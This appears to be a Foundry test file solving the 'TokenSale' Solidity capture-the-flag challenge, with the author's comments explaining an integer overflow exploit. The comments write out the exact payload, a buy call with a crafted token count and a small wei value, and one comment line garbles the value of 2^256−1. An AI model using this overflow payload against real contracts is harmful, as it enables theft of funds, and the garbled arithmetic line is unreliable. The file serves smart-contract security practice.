// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 4 ether);
    }

    // Use the instance of tokenSale and exploitContract
    function testIncrement() public {
        // Put your solution here

        // From my obsidian:
        // - `type(uint256).max` is the maximum value a `uint256` can hold: 
        // 	- 2^256 − 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935
        // 	- 2^{256} - 1 = 1157920892373161954235709850086879078532699846656405640394575840079131296399352256 − 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935
        // - Dividing by `1e18` (since `PRICE_PER_TOKEN = 1 ether`), we get: 
        // 	- type(uint256).max/1e18 = 115792089237316195423570985008687907853269984665640564039457584007
        // - Adding `+2` ensures that the multiplication overflows.
        // - Since `numTokens * PRICE_PER_TOKEN` overflows, the contract expects a very small `msg.value` instead of a huge one.
        // - The exploit value `1415992086870360064 wei` is what the contract expects after the overflow, tricking it into selling you an enormous number of tokens at an incredibly cheap price.
        // - `tokenSale.buy{ value: 1415992086870360064 }(type(uint256).max / 1e18 + 2);`
        // - This causes anoverflow, setting `total` to a small value.
        // - The contract believes the attacker paid the correct amount, but the attacker actually receives a massive number of tokens.
        exploitContract.attack();

        // that made my brain exploded a bit


        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
